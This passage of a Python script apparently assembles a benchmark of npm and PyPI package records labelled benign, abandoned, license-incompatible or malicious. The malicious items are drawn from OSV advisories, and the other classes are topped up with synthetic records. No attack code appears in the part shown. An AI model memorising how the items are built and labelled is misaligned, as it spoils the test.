        elif not triggers and fresh:
            pools["benign"].append(("pypi", rec))
    for p in pools.values():
        rng.shuffle(p)

    per = n // 4
    items = []
    used = set()

    def add(label, reg, name, st, synthetic_fields, hard, extra=None):
        key = f"{label}/{reg}/{name}"
        if key in used: return
        used.add(key)
        source = ("npm" if reg == "npm" else "pypi") if not synthetic_fields else "synthetic"
        meta = {"source": source, "registry": reg, "synthetic_fields": synthetic_fields, "hard": hard}
        if extra: meta.update(extra)
        items.append(Item(NAME, key, st, label, meta))

    def render(reg, rec):
        return _state_npm(rec) if reg == "npm" else _state_pypi(rec)

    # benign: real (npm + pypi), real hard (legit scripts), a few template hard
    n_hard_real = min(len(pools["benign_hard"]), per // 8)
    for reg, rec in pools["benign_hard"][:n_hard_real]:
        add("benign", reg, rec["name"], render(reg, rec), [], True, {"license_declared": rec["license"]})
    n_tmpl_hard = 12
    for reg, rec in pools["benign"][: per - n_hard_real - n_tmpl_hard]:
        add("benign", reg, rec["name"], render(reg, rec), [], False, {"license_declared": (rec.get("license") or _pypi_license(rec))})
    donors = [r for r in pools["benign"] if r[0] == "npm"][per:] or [r for r in pools["benign"] if r[0] == "npm"]
    for i in range(n_tmpl_hard):
        reg, rec = donors[i % len(donors)]
        st = _state_npm(rec); st["install_scripts"] = HARD_BENIGN_SCRIPTS[i % len(HARD_BENIGN_SCRIPTS)]
        add("benign", reg, rec["name"] + f"#hb{i}", st, ["install_scripts"], True)

    # abandoned: real first, synthetic top-up
    for reg, rec in pools["abandoned"][:per]:
        add("abandoned", reg, rec["name"], render(reg, rec), [], False, {"license_declared": rec.get("license") or _pypi_license(rec)})
    i = 0
    while sum(1 for it in items if it.label == "abandoned") < per and donors:
        reg, rec = donors[(i * 3 + 1) % len(donors)]; st, sf = _synth_abandoned(rec, rng)
        add("abandoned", reg, rec["name"] + f"#ab{i}", st, sf, False); i += 1

    # license_incompatible: real first, synthetic top-up
    for reg, rec in pools["license_incompatible"][:per]:
        add("license_incompatible", reg, rec["name"], render(reg, rec), [], False, {"license_declared": rec.get("license") or _pypi_license(rec)})
    i = 0
    while sum(1 for it in items if it.label == "license_incompatible") < per and donors:
        reg, rec = donors[(i * 5 + 2) % len(donors)]; st, sf = _synth_license(rec, rng)
        add("license_incompatible", reg, rec["name"] + f"#li{i}", st, sf, False); i += 1

    # malicious: real OSV advisories; ~13% hard
    n_hard = per // 8
    npm_adv = [a for a in mal if a["ecosystem"] == "npm"]; pypi_adv = [a for a in mal if a["ecosystem"] == "pypi"]
    chosen = []
    for k in range(per):
        src = npm_adv if (k % 3 != 2 or not pypi_adv) else pypi_adv
        if not src: src = npm_adv or pypi_adv
        chosen.append(src.pop())
    for k, adv in enumerate(chosen):
        hard = k < n_hard
        st, sf = _mal_state(adv, rng, hard)
        add("malicious", adv["ecosystem"], adv["name"], st, sf, hard, {"advisory_id": adv["id"], "source": "osv", "osv_sources": adv.get("sources", [])})

    rng.shuffle(items)
    for it in items: it.state = _scrub(it.state)
    return items


if __name__ == "__main__":
    import sys
    from collections import Counter
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 1200
    items = build(n, seed=int(sys.argv[2]) if len(sys.argv) > 2 else 0)
    p = write_items(NAME, items)
    print(p, len(items))
    print("labels:", Counter(it.label for it in items))
    print("label/source:", Counter((it.label, it.meta["source"]) for it in items))
    print("hard:", sum(it.meta["hard"] for it in items))
